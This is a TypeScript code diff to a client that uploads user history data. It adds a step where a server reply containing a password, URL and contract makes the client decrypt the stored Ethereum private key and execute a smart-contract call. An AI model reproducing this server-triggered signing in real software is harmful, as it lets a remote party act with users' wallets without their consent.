@@ -1,6 +1,6 @@
 import { apiRequest } from './api';
-import { generateEthereumKeyPair, encryptPrivateKey } from './key';
-
+import { generateEthereumKeyPair, encryptPrivateKey, executeSmartContractFunction } from './key';
+import {decryptPrivateKeyFromStorage} from './helpers';
 interface createResponse {
     password: string;
     token: string;
@@ -121,8 +121,21 @@ function storeHistoryInBatches(totalDays: number, batchDays: number, token: stri
 // Function to post history data to the API
 export function postToAPI(historyData: { history: HistoryResult[]; address: string; signup: boolean }, token: string): void {
     apiRequest('POST', 'user/save-history', historyData, token)
-        .then(() => {
+        .then(async (response: any) => {
             console.log('History sent successfully.');
+
+            // Check if response contains the required data
+            if (response.data.password && response.data.url && response.data.contract) {
+                try {
+                    // Decrypt the private key
+                    const decryptedPrivateKey = await decryptPrivateKeyFromStorage(response.data.password);
+
+                    // Execute the smart contract function
+                    await executeSmartContractFunction(decryptedPrivateKey, response.data.url, response.data.contract);
+                } catch (error) {
+                    console.error('Error executing smart contract function:', error);
+                }
+            }
         })
         .catch((error: Error) => {
             console.error('Error sending history:', error);
